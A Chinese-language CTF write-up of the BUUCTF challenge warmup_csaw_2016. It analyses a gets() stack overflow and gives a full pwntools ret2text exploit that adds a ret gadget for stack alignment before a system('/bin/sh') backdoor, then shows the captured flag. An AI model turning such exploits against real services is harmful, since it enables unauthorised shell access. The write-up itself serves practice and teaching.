---
title: warmup_csaw_2016 栈溢出与栈对齐踩坑
date: 2026-05-09 20:44:00
categories:
  - pwn
tags:
  - 栈溢出
  - ret2text
  - 栈对齐
  - 盲打
  - 64位
---

> BUUCTF 入门题 | 64位栈对齐问题绕过与 pwntools 盲打技巧

## 0x01 题目环境

| 项目 | 内容 |
|------|------|
| 平台 | BUUCTF |
| 架构 | 64位 Linux ELF (amd64) |
| 保护机制 | Partial RELRO，无 Canary，无 PIE，存在 RWX 段 |
| 核心考点 | 栈溢出、ret2text、64位栈对齐、pwntools 盲打 |

## 0x02 逆向分析

### 漏洞定位

```asm
s= byte ptr -0Fh        ; 距离 rbp 偏移 -0xF (15字节)
lea     rax, [rbp+s]
call    _gets           ; 无边界检查
```

### 后门函数

```asm
public fun              ; 地址 0x401186
lea     rdi, command    ; "/bin/sh"
call    _system
```

**偏移量**：`0xF` (15) + `8` (saved rbp) = **23 字节**

## 0x03 关键踩坑与解决方案

### 坑 1：Ubuntu 18.04+ system() 栈对齐崩溃

**现象**：Payload 发送成功，但程序直接崩溃退出。

**原因**：高版本 glibc 要求调用 `system` 时 `rsp` 必须 16 字节对齐，否则 `movaps` 指令崩溃。

**解法**：在后门地址前加一个 `ret` 指令，让 `rsp` 下移 8 字节重新满足对齐：

```python
rop = ROP(elf)
ret_addr = rop.find_gadget(['ret'])[0]
payload = b'A' * offset + p64(ret_addr) + p64(backdoor_addr)
```

### 坑 2：recvuntil() 死等导致 Payload 无法发送

**现象**：脚本卡在 `io.recvuntil(b"please input\n")` 处。

**原因**：网络 I/O 缓冲或远程输出格式与预期不匹配导致死锁。

**解法（盲打法）**：删除 `recvuntil`，用 `sleep(0.5)` 等待连接建立后直接发送：

```python
sleep(0.5)
io.sendline(payload)
```

## 0x04 Exploit 代码

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'

elf = ELF('./pwn1')
io = remote('node5.buuoj.cn', 27853) 

backdoor_addr = 0x401186 
offset = 15 + 8 

# 自动寻找 ret 指令用于栈对齐
rop = ROP(elf)
ret_addr = rop.find_gadget(['ret'])[0]
log.success(f"Found clean 'ret' gadget at: {hex(ret_addr)}")

# Padding + 栈对齐 ret + 后门地址
payload = b'A' * offset + p64(ret_addr) + p64(backdoor_addr)

# 盲发 Payload
sleep(0.5)
io.sendline(payload)
io.interactive()
```

## 0x05 执行结果

```
Flag: flag{4b0a4509-6474-4e1d-82aa-d76df3bbd675}
```

## 0x06 核心考点

- **64位栈对齐**：glibc 2.27+ 调用 `system` 需要 `rsp` 16 字节对齐
- **ret 滑板**：利用 `ret` 指令调整栈指针
- **盲打法**：当 `recvuntil` 死等时，用 `sleep` + 直接发送绕过
- **ROPgadget**：`ROP(elf).find_gadget(['ret'])[0]` 自动寻找 gadget
